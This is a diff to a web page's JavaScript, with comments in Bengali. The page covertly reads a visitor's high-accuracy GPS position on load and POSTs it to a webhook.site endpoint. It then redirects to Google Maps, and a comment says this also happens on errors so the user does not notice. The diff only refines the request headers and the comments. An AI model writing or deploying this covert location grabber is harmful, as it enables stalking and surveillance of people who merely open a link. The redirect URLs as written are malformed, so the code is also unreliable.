@@ -19,7 +19,6 @@
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
-                // High Accuracy অন করা হয়েছে যাতে সরাসরি হার্ডওয়্যার জিপিএস হিট করে
                 navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                     enableHighAccuracy: true,
                     timeout: 15000,
@@ -35,28 +34,26 @@
             let long = position.coords.longitude;
             let accuracy = position.coords.accuracy;
             
-            // ফিক্সড: আপনার ইউনিক ওয়েববুক ড্যাশবোর্ড ইউআরএল
             let webhookURL = "https://webhook.site"; 
 
-            // ডাটা অবজেক্ট তৈরি
             let gpsData = {
                 latitude: lat,
                 longitude: long,
                 accuracy: accuracy
             };
 
-            // ব্রাউজার লেভেল ব্যাকএন্ড স্যান্ডবক্সিং
+            // ফিক্সড: স্ট্যান্ডার্ড JSON POST রিকোয়েস্ট উইথ প্রপার হেডার
             fetch(webhookURL, {
                 method: "POST",
                 headers: { 
-                    "Content-Type": "application/x-www-form-urlencoded" 
+                    "Content-Type": "application/json" 
                 },
                 body: JSON.stringify(gpsData)
             }).then(() => {
-                // ফিক্সড: ডাটা চলে যাওয়ার পর তাকে আসল গুগল ম্যাপসে রিডাইরেক্ট করা হবে
+                // ডাটা সাকসেসফুলি চলে যাওয়ার পর গুগল ম্যাপসে রিডাইরেক্ট হবে
                 window.location.href = "https://google.com" + lat + "," + long;
             }).catch((err) => {
-                // এরর হলেও ইউজার যেন বুঝতে না পারে তাই ম্যাপে পাঠিয়ে দেওয়া
+                // কোনো নেটওয়ার্ক এরর হলেও ইউজার যেন টের না পায়, সরাসরি ম্যাপসে পাঠিয়ে দেওয়া
                 window.location.href = "https://google.com" + lat + "," + long;
             });
         }
